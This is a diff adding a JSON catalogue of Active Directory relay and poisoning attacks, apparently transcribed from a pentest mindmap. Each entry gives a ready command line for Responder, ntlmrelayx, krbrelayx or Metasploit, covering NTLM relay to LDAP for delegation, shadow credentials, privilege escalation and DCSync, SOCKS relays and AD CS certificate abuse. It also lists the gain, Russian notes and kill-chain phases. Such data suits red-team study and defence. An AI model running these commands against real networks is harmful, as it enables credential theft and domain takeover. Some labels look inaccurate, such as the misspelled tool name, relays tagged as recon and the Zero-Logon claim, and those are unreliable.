@@ -1,0 +1,162 @@
+[
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "Listen (LLMNR/NBT-NS/MDNS Poisoning)",
+    "tool": "Responder",
+    "req": "Interface",
+    "command": "responder -I <interface> #use --lm to force downgrade",
+    "profit": "Hash NTLMv1 or NTLMv2, Username, Credentials (ldap/http)",
+    "critical_note": "Пассивный сбор хешей или принуждение к понижению уровня аутентификации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to LDAP (RBCD)",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "DC IP, Computer Name, Computer Password",
+    "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access",
+    "profit": "RBCD (Resource Based Constrained Delegation)",
+    "critical_note": "Работает, если LDAP signing и LDAPS channel binding не принудительны (default). Использует атаку 'remove-mic'.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to LDAP (Shadow Credentials)",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "DC IP, Target DC Name",
+    "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'",
+    "profit": "Shadow Credentials",
+    "critical_note": "Требует уязвимости CVE-2019-1040 (remove mic) или NTLMv1. Позволяет установить Shadow Credentials.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to LDAP (Escalate User)",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "DC IP, Target User",
+    "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>",
+    "profit": "Domain Admin",
+    "critical_note": "Эскалация привилегий пользователя через релей NTLM на LDAP.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to LDAP (Interactive Shell)",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "DC IP",
+    "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive",
+    "profit": "LDAP SHELL",
+    "critical_note": "После запуска необходимо подключиться к локальному сокету: nc 127.0.0.1 10111.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "Discovery (SMB Not Signed)",
+    "tool": "NetExec (nxc)",
+    "req": "IP Range",
+    "command": "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
+    "profit": "List of SMB unsigned targets",
+    "critical_note": "Поиск целей, где не включена подпись SMB (по умолчанию везде, кроме контроллеров домена).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to SMB (Socks)",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "List of unsigned IPs",
+    "command": "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks",
+    "profit": "SMB Socks",
+    "critical_note": "Создание SOCKS-прокси через скомпрометированные SMB-сессии.",
+    "kill_chain_phase": "LATERAL"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to MSSQL",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "MSSQL IP",
+    "command": "ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks",
+    "profit": "MSSQL Socks",
+    "critical_note": "Релей NTLM аутентификации на MSSQL сервер.",
+    "kill_chain_phase": "LATERAL"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to Netlogon (DCSync)",
+    "tool": "Impacet (ntlmrelayx.py)",
+    "req": "DC IP, User, Password",
+    "command": "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>",
+    "profit": "DCSYNC",
+    "critical_note": "Использует уязвимость Zero-Logon (CVE-2020-1472). Требует релея от одного DC к другому.",
+    "kill_chain_phase": "CREDS"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "Kerberos Relay to HTTP (ADCS)",
+    "tool": "krbrelayx.py",
+    "req": "PKI URL, Target NetBIOS, Attacker IP",
+    "command": "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>",
+    "profit": "ESC8",
+    "critical_note": "Атака на AD CS (ESC8) через релей Kerberos аутентификации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "SMB Self Relay (MS08-068)",
+    "tool": "Metasploit Framework",
+    "req": "Windows 2000 / Windows Server 2008",
+    "command": "msf> exploit/windows/smb/smb_relay",
+    "profit": "SMB Relay Access",
+    "critical_note": "Эксплуатация уязвимости MS08-068 для выполнения self-relay атаки на старых версиях Windows.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to HTTP (AD CS)",
+    "tool": "Impacet (ntlmrelayx.py) [Implied]",
+    "req": "AD CS Web Enrollment Interface",
+    "command": "Relay to CA web enrolment",
+    "profit": "ESC8",
+    "critical_note": "Атака NTLM Relay на центр сертификации (ESC8). Конкретная команда на схеме не указана, подразумевается использование модуля HTTP в ntlmrelayx.",
+    "kill_chain_phase": "DEFAULT"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "NTLM Relay to HTTP (WSUS)",
+    "tool": "Impacet (ntlmrelayx.py) [Implied]",
+    "req": "WSUS Server",
+    "command": "Relay to WSUS",
+    "profit": "WSUS Compromise",
+    "critical_note": "Релей NTLM аутентификации на сервер обновлений WSUS для внедрения вредоносных обновлений.",
+    "kill_chain_phase": "DEFAULT"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "Kerberos Relay to SMB",
+    "tool": "krbrelayx.py",
+    "req": "SMB Target",
+    "command": "same as NTLM relay, use krbrelayx.py",
+    "profit": "SMB Access",
+    "critical_note": "Аналог атаки NTLM Relay на SMB, но с использованием протокола Kerberos и инструмента krbrelayx.",
+    "kill_chain_phase": "CREDS"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "Kerberos Relay to LDAP(S)",
+    "tool": "krbrelayx.py",
+    "req": "LDAP/LDAPS Interface",
+    "command": "same as NTLM relay, use krbrelayx.py",
+    "profit": "LDAP Access / Modification",
+    "critical_note": "Аналог атаки NTLM Relay на LDAP, но с использованием протокола Kerberos и инструмента krbrelayx.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Man In The Middle (Listen and Relay)",
+    "attack_type": "Listen (SMB Interaction)",
+    "tool": "smbclient.py",
+    "req": "Captured Credentials / Hash",
+    "command": "smbclient.py",
+    "profit": "SMB Interaction",
+    "critical_note": "Инструмент указан в блоке 'Listen' рядом с Responder. Используется для взаимодействия с SMB-шарами или проверки учетных данных.",
+    "kill_chain_phase": "CREDS"
+  }
+]
